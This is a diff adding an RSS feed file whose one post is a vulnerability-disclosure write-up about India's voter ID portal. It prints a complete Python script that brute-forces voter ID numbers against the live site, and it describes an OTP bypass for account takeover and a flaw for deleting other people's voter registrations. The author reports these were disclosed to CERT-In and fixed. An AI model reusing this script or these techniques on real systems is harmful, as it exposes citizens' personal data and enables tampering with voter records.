@@ -1,0 +1,162 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title></title>
+    <link>http://localhost:4000</link>
+    <description>
+      Cyber Security, Bug Bounties, CTF
+    </description>
+    
+        
+            <item>
+                <title>Exposing Millions of Voter ID card users’ details.</title>
+                <link>http://localhost:4000/vdp/2022/07/07/exposing-millions-of-voter-ID-card-users-details/</link>
+                <content:encoded>
+                    <![CDATA[
+                    <p align="center">
+  <img src="/images/voter-ID/voter.png" />
+</p>
+
+<p><em>Hi, Everyone. hope you’re well. I’m <a href="https://twitter.com/nxtexploit">Aziz</a>. Through this write-up, I will share some security issues I’ve found on the official Voter ID card maintaining platform <a href="https://nvsp.in">http://nvsp.in</a>. I was filling out a correction form for my mom’s card, I’m not really interested in finding bugs on gov websites :`) that moment <a href="https://portswigger.net/burp/documentation/desktop/penetration-testing">burpsuite </a>was running in the background and I thought let’s have a try. After spending half an hour I found some critical issues that I’m going to share. All these issues are already fixed by the government.</em></p>
+
+<p>In India, a <a href="https://www.google.com/search?q=what+is+voter+ID+%28india%29">Voter ID</a> card is an identity document issued by the Election Commission of India to adult domiciles of India who have reached the age of 18, which primarily serves as an identity proof for Indian citizens while casting their ballot in the country’s municipal, state, and national elections. More than <strong>780 million</strong> Voter IDs are active at present.</p>
+
+<ul>
+  <li>
+    <h2 id="bruteforcing-valid-voter-ids-and-extracting-details-idor--bola"><strong>Bruteforcing valid Voter IDs and extracting details (IDOR / BOLA)</strong></h2>
+  </li>
+</ul>
+
+<p>While registering a new account it shows two options “I have <code class="language-plaintext highlighter-rouge">EPIC</code> number” and “I don’t have <code class="language-plaintext highlighter-rouge">EPIC</code> number”. <code class="language-plaintext highlighter-rouge">EPIC</code> stands for Electors Photo Identification Card and the <code class="language-plaintext highlighter-rouge">EPIC</code> number is nothing but Voter ID no. If we chose we don’t have a Voter ID number then they will give you an option to add after registering on the portal. After registration, I tried to add any random <code class="language-plaintext highlighter-rouge">EPIC</code> no. with my account but it show it’s not valid. So I sent that HTTP request to burp intruder for <a href="https://en.wikipedia.org/wiki/Brute-force_attack">brute-forcing</a>.</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/2728/1*SKG6_nhMm0PkRkRXJjK2yg.png" alt="" /></p>
+
+<p>A Voter ID also known as <code class="language-plaintext highlighter-rouge">EPIC</code> number is an alphanumerical ID, it contains three Alphabets at starting and seven numbers i.e. <code class="language-plaintext highlighter-rouge">WRI2345678</code>, <code class="language-plaintext highlighter-rouge">RDH2345678</code>, <code class="language-plaintext highlighter-rouge">DTN2345678</code>, <code class="language-plaintext highlighter-rouge">YCV2345678</code>, <code class="language-plaintext highlighter-rouge">NLN2345678</code>, <code class="language-plaintext highlighter-rouge">XMB2345678</code>, etc. These three alphabets are Not random alphabets, you can find similar IDs with similar these three alphabets in beginning but the rest seven digits are different.</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*oCiejaOMRmwdEpIRzi27PQ.png" alt="" /></p>
+
+<p>I added the payload position on these seven-digit numbers on <code class="language-plaintext highlighter-rouge">Epic_no=</code> parameter i.e <code class="language-plaintext highlighter-rouge">Epic_no=WRI$2345678$</code>  (as you can see in the below screenshot.)</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/2236/1*xz61EAZwEhSWlsDpMkJSSw.png" alt="Adding payload position" /></p>
+
+<p>Surprisingly there is no limitation implemented in the backend and I was able to send <strong>unlimited requests</strong> without getting blocked by firewall. As a result backend server responding 302 redirections for every valid voter ID. (As shown in the screenshot below)</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/2740/1*dLe_eyFiPf9amQz0o50meQ.png" alt="responding 302 for every valid voter ID" /></p>
+
+<p>Then I wrote a <a href="https://github.com/nxtexploit/Voter-ID-bruteforcer/blob/main/Voter-ID-bruteforcer.py">python script</a> that will brute force the values and give output all valid voter_IDs for me.</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*DA8ghQIWnJlNZty0OK6oEA.gif" alt="" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">import</span> <span class="nn">urllib3</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
+<span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+<span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span> 
+
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'nvsp'</span><span class="p">:</span> <span class="s">'4e565XXXXX'</span><span class="p">,</span>
+    <span class="s">'cookiesession1'</span><span class="p">:</span> <span class="s">'678B286C164561FFEFXXXXXXXXXXX'</span><span class="p">,</span>
+    <span class="s">'nvsp'</span><span class="p">:</span> <span class="s">'4e56XXXXX'</span><span class="p">,</span>
+    <span class="s">'nvspid'</span><span class="p">:</span> <span class="s">'ycnpiabqfasdf0asdf09ad'</span><span class="p">,</span>
+    <span class="s">'__RequestVerificationToken'</span><span class="p">:</span> <span class="s">'taDxPTIR3vxuyduujVCoi5eJdSlsAv1X0MQea7VYvLf6ksNDNsK7BkQZbNLSKagASDFpouasdfuopasfcsCmlofM6tTlC1opGS9FBEjYYXxC-z9ze73zdtEjUXtq9JfGVDfsXwt3WmQ925gSsbUw2'</span><span class="p">,</span>
+    <span class="s">'.ASPXAUTH'</span><span class="p">:</span> <span class="s">'53BDCF7905E361CB6ECE80B77506A1A4A54DFS6546A5DF787AS8DFB2B9CE6874FDE524BF7BAE0DDC59329705AB29D49A148B4494341EC7634C13DB69FA25425DCA10CAADA3A10B025D58D8220E842959F0C650A8DF39B43039354B537BCE61AFB4922B99E22F20DC099C0DE9BC2CA53D1A37F387867855DDE5D89583B2F5F95D898A'</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'Host'</span><span class="p">:</span> <span class="s">'www.nvsp.in'</span><span class="p">,</span>
+    <span class="s">'Cache-Control'</span><span class="p">:</span> <span class="s">'max-age=0'</span><span class="p">,</span>
+    <span class="s">'Sec-Ch-Ua'</span><span class="p">:</span> <span class="s">'".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"'</span><span class="p">,</span>
+    <span class="s">'Sec-Ch-Ua-Mobile'</span><span class="p">:</span> <span class="s">'?0'</span><span class="p">,</span>
+    <span class="s">'Sec-Ch-Ua-Platform'</span><span class="p">:</span> <span class="s">'"Windows"'</span><span class="p">,</span>
+    <span class="s">'Upgrade-Insecure-Requests'</span><span class="p">:</span> <span class="s">'1'</span><span class="p">,</span>
+    <span class="s">'Origin'</span><span class="p">:</span> <span class="s">'https://www.nvsp.in'</span><span class="p">,</span>
+    <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">,</span>
+    <span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'</span><span class="p">,</span>
+    <span class="s">'Accept'</span><span class="p">:</span> <span class="s">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'</span><span class="p">,</span>
+    <span class="s">'Sec-Fetch-Site'</span><span class="p">:</span> <span class="s">'same-origin'</span><span class="p">,</span>
+    <span class="s">'Sec-Fetch-Mode'</span><span class="p">:</span> <span class="s">'navigate'</span><span class="p">,</span>
+    <span class="s">'Sec-Fetch-User'</span><span class="p">:</span> <span class="s">'?1'</span><span class="p">,</span>
+    <span class="s">'Sec-Fetch-Dest'</span><span class="p">:</span> <span class="s">'document'</span><span class="p">,</span>
+    <span class="s">'Referer'</span><span class="p">:</span> <span class="s">'https://www.nvsp.in/Account/MyProfile'</span><span class="p">,</span>
+    <span class="s">'Accept-Language'</span><span class="p">:</span> <span class="s">'en-US,en;q=0.9'</span><span class="p">,</span>
+    <span class="s">'Connection'</span><span class="p">:</span> <span class="s">'close'</span><span class="p">,</span>
+<span class="p">}</span>
+
+
+<span class="k">for</span> <span class="n">voter_ID</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2000000</span><span class="p">,</span><span class="mi">2999999</span><span class="p">,</span><span class="mi">1</span><span class="p">):</span>
+
+
+    <span class="n">data</span> <span class="o">=</span> <span class="s">'__RequestVerificationToken=dayrB-CCldwVYHXi7OE8b455jM3jLXRIdlHGQ5Wf4XyFE_7jjo1X3VfmkC4ZanqFO6h0XtveuAmSk1SIWWmV-SbA7nTUIJNKAfyRoiG43FvEAlDPi5VfkJWpGn9sV8IuFuBezLnC-tZSYFGqrRbECXgqlxpSduENgqaWy7oWQK01&amp;OTP=&amp;UserId=UQH34XXXXXXXX&amp;firstName=Aziz&amp;lastName=&amp;Email=XXXXXXXX%40gmaill.com&amp;Epic_no=WRI'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">voter_ID</span><span class="p">)</span><span class="o">+</span><span class="s">'&amp;PhoneNumber=XXXXXXXX87&amp;st_code=S25&amp;ac_no=55&amp;PART_NO=42&amp;Captcha=&amp;Code='</span>
+
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://www.nvsp.in/Account/MyProfile'</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Epic-ID FOUND = "</span><span class="o">+</span><span class="n">colored</span><span class="p">(</span><span class="s">"WRI"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">voter_ID</span><span class="p">),</span><span class="s">'green'</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"Not valid ID"</span><span class="p">,</span><span class="s">'yellow'</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"Session Expired "</span><span class="p">,</span><span class="s">'red'</span><span class="p">)</span><span class="o">+</span><span class="s">"(response code = "</span><span class="o">+</span><span class="n">colored</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">status_code</span><span class="p">),</span><span class="s">'yellow'</span><span class="p">)</span><span class="o">+</span><span class="s">")"</span><span class="p">)</span>
+
+<span class="n">finish</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">perf_counter</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\n\n</span><span class="s">Finished in </span><span class="si">{</span><span class="nb">round</span><span class="p">(</span><span class="n">finish</span><span class="o">-</span><span class="n">start</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="s"> second(s)</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Now I have valid Voter IDs of random persons then, I added these IDs with my profile under “<a href="https://www.nvsp.in/Account/MyProfile">/Account/MyProfile</a>”. Then there is an option under the “/<a href="https://www.nvsp.in/Forms">forms</a>/”section which is <strong>form001</strong> and this form is already filled with **Name, father’s name, address, Date of birth, etc. **according to that valid EPIC ID added to my profile.</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/2732/1*6izoRB4cWjN5zjdZTDYdJg.png" alt="**Extracted details of a random Person**" /></p>
+
+<ul>
+  <li>
+    <h2 id="account-takeover-otp-bypass"><strong>Account takeover (OTP bypass)</strong></h2>
+  </li>
+</ul>
+
+<p>On the profile details updating section I was trying to add another user’s number. So I created another account for it. But there was an OTP implanted there, and I tried to brute-force it but it didn’t work :( I remember reading an article last year, you can read it <strong><a href="https://infosecwriteups.com/how-i-hacked-into-indias-top-matrimonial-website-and-earned-amazon-gift-card-worth-10k-inr-2a0b376219fa">here</a></strong>, where the author just added 0 after intercepting the request. And I did the same thing here on OTP parameter and it worked :)</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/2740/1*q0TSMqdgsXTtzROWDo6y9g.png" alt="intercepting traffic while OTP is verifying" /></p>
+
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*eEVjGxhUUzdbv2vkHlExnw.png" alt="[Changed the OTP value to zero](https://infosecwriteups.com/how-i-hacked-into-indias-top-matrimonial-website-and-earned-amazon-gift-card-worth-10k-inr-2a0b376219fa)" /></p>
+
+<p>After bypassing I thought it just can register the victim’s number then I’ll reset the password, But surprisingly on replacing the victim’s number my profile data automatically changed with the victim’s details, And I can own his account.</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/2740/1*az1-jwdyMLK1pOLWbA6ghA.png" alt="" /></p>
+
+<ul>
+  <li>
+    <h2 id="deleteremove-any-random-users-voter-id-card-permanently-logic-flaw"><strong>Delete/remove any random user’s Voter ID card Permanently (Logic flaw)</strong></h2>
+  </li>
+</ul>
+
+<p>From the 1st bug, we can get and add any random user’s Voter ID to our account, From that on the home page there is an option for “Deletion of Enrolment”. And nothing to be needed after an attacker added any random Voter ID on his profile section. then he can easily delete any random user’s Voter ID permanently.</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/2732/1*SvvI8ZoSelvF3-83BzQRTw.png" alt="An attacker can delete any random user’s card permanently" /></p>
+
+<p>I reported these three issues to <a href="https://www.cert-in.org.in/VulnerIncident.jsp">vdisclose@cert-in.org.in</a> and they fixed these issues.</p>
+
+<p>I hope you liked this article, If you have any questions then you can dm me on Twitter: <a href="https://twitter.com/nxtexploit">https://twitter.com/nxtexploit</a></p>
+
+<p>Thanks for reading,</p>
+
+<p>regards,</p>
+
+<p><strong>Aziz</strong></p>
+
+                    ]]>
+                </content:encoded>
+                <guid isPermaLink="false">/vdp/2022/07/07/exposing-millions-of-voter-ID-card-users-details/</guid>
+                <description>
+                    
+                    Three critical bugs in India&apos;s voter portal led to the exposure of voter ID card users&apos; data, impacting millions of individuals.
+                    
+                </description>
+                <pubDate>Thu, 07 Jul 2022 00:00:00 +0530</pubDate>
+                <author>Aziz Al Aman</author>
+            </item>
+        
+    
+  </channel>
+</rss>
